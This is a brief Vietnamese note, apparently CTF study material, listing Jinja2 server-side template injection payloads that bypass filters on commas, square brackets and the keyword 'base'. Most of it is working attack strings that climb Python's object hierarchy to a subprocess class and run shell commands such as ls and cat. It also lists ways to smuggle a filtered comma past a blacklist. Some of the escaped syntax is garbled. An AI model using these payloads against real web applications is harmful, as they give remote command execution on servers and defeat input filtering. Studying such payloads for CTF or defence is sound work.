SSTI bypass ',' filter 1 cái gì đó như base subclass.... hay filter '' "" ....


Filter [], base 
Jinja2
{{ ['1objectgidooday'].\_\_class__["\_\_bASe__".lower()].\_\_subclasses__()[262]\(["ls","/aaaa"],stdout=-1).communicate() }}

Python bth
getattr("['1objectgidooday'].\_\_class__","["\_\_bASe__".lower()].\_\_subclasses__()[262]\(["ls","/aaaa"],stdout=-1).communicate()")

Gọi 1 object bất kì như là [0] hay ['aaaa'], chuyển toàn bộ bằng hàm lower rồi ghép chữ


Filter dấu , 

{{ ['1objectgidooday'].\_\_class__["\_\_bASe__".lower()].\_\_subclasses__()[262]\(\*(["cat#/aaaaa".split('#')]+[-1]+[None]+[None]+[-1])).communicate() }}

nhiều cách chr(44), \x2c, []+[], "a#b".split("#") > [a,b]

\*(["cat#/haaaaaa".split('#')]+[-1]+[None]+[None]+[-1])) 
tương đương
(["cat","/aaaaa".split('#')"],stdout=-1)

